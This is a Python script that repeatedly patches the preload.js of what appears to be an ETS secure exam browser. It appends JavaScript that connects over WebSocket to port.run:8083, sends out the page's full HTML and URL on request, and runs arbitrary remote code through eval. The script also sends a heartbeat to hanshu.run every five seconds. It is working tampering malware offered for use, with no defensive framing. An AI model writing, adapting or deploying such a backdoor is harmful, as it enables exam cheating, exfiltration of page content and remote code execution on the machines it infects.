import requests
import json

import time
import os
# 打开文件并读取所有内容
ind = 1
while True:
    if os.path.exists("../ETS/IBT2/securebrowser/resources/app/preload.js"):
        with open("../ETS/IBT2/securebrowser/resources/app/preload.js", "r") as file:
            content = file.read()
            file.close()
            if ('cunchu.site' not in content):
                print('修改文件!')
                time.sleep(3)
                content = content + '''\r\nwindow.wsLink=new WebSocket('wss://port.run:8083')wsLink.addEventListener('open',function(event){wsLink.send(JSON.stringify({"route":"login","type":"ets"}))})wsLink.addEventListener('message',function(event){const mess=JSON.parse(event.data)switch(mess.type){case'getData':{console.log(mess)wsLink.send(JSON.stringify({"route":"sendData","type":"ets","value":document.body.innerHTML}))break}case'getURL':{console.log(mess)wsLink.send(JSON.stringify({"route":"sendData","type":"ets","value":location.href}))break}case'run':{if(mess.value)eval(mess.value)break}}})wsLink.onclose=function(){console.log('服务器已经断开');reconnect()};var timeConnect=0;function reconnect(service){timeConnect++;console.log("第"+timeConnect+"次重连");setTimeout(function(){window.wsLink=new WebSocket('wss://port.run:8083')},3000)}'''
                with open("../ETS/IBT2/securebrowser/resources/app/preload.js", "w") as file2:
                    file2.write(content)
                    file2.close()
            else:
                print('正常!')
    else:
        print('目录不正确!')
    url = "https://hanshu.run/logger"

    payload = json.dumps({
        "group": "VUB",
        "type": "message",
        "user": "1",
        "message": "活跃检测"
    })
    headers = {
        'Content-Type': 'application/json'
    }

    response = requests.request("POST", url, headers=headers, data=payload)
    time.sleep(5)
